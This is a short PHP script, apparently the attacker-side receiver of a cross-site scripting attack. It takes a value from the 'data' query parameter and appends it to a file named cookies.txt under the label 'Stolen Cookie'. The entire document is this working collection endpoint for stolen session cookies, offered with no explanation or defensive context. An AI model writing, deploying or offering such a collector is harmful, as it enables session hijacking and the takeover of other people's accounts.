<?php
$cookie_data = $_GET['data'];
$file = fopen("cookies.txt", "a");
fwrite($file, "Stolen Cookie: " . $cookie_data . "\n");
fclose($file);
?>
